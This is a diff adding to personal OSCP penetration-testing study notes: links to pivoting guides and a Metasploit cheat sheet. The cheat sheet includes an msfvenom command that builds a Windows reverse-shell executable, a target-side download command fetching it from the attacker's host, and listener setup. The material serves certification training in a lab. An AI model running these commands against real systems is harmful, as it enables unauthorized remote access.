@@ -211,6 +211,8 @@ https://medium.com/@Thigh_GoD/ligolo-ng-finally-adds-local-port-forwarding-5bf9b
  **Local Port Forwarding:**
 	- `ip route add 240.0.0.1/32 dev`
 	- **240.0.0.1** will point to whatever machine Ligolo-ng has an active tunnel on.
+## Other tools
+While the OSCP Lab discusess other tools such as socat, sshuttle, and plink, I found that [Ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases) was about to provide all of the same functionality and more simply. That said, I am linking a guide discusess the other tools. Here is frankyyano's [Pivoting & Tunneling guide](https://medium.com/@frankyyano/pivoting-tunneling-for-oscp-and-beyond-33a57dd6dc69). 
 
 # File Sharing
 ### Python server
@@ -235,6 +237,38 @@ scp -P \<ssh port> \<file to copy> user@\<destination IP>:\<destination folder>
 ## Crackmapexec
 ## Impacket
 ## Metasploit
+### Initial Usage
+Selecting a module:
+  - show auxiliary - shows auxiliary modules
+  - search type:auxiliary smb - searches for auxiliary modules which include smb
+  - info - after selecting learn more about the module
+  - vulns - after running check to see if there were any discovered
+  - creds - check for any creds discovered during the use of msfconsole
+  - search Apache 2.4.49 - search for Apache 2.4.49 exploits
+ Dealing with sessions:
+  - sessions -l - list sessions 
+  - sessions -i 2 - initiate session 2
+Dealing with channels (meterpreter):
+  - ^Z - background channel - y
+  - channel -l - list channels
+  - channel -i - channel -i 1
+Dealing with jobs:
+  - run -j
+  - jobs - checks for runnign jobs
+
+Local commands:
+  - lpwd - local (attacking machine) pwd
+  - lcd - local (attacking machine) cd
+  - upload /usr/bin/<binary> /tmp/ - uploads binary such as linux-privesc-check from Attacking machine to target
+
+Payloads (msfvenom)
+  - msfvenom -l payloads --platform windows --arch x64 - lists payloads for windows 64 bit 
+  - msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.157 LPORT=443 -f exe -o nonstaged.exe - creates a reverse shell tcp payloads on that for attacker (LHOST) with the exe format and the name nonstaged.exe
+  - iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe (execute from Target to download shell)
+    - use nc -lvnp 443 or multi/handler
+  - use multi/handler - exploit in msf
+  - set payload windows/x64/shell/reverse_tcp - so either set up in nc or msfconsole's multi/handler
+
 ### Post Exploit 
 - idletime (meterpreter) - check that user's idletme
 - shell - switch to shell
@@ -349,10 +383,6 @@ For the field that says "place your shellcode here," such code can be generated 
 
 ## Buffer Overflow
 As these are my OSCP notes, and there is no longer a buffer overflow machine on the exam, I'm leaving this content out of the guide for brevity. Instead I'll link a resource which turned out to be better and more succinct than the notes I took on the subject when I went through the course. Here is [V1n1v131r4's guide on Buffer Overflows](https://github.com/V1n1v131r4/OSCP-Buffer-Overflow). 
-
-
-
-
 
 
 
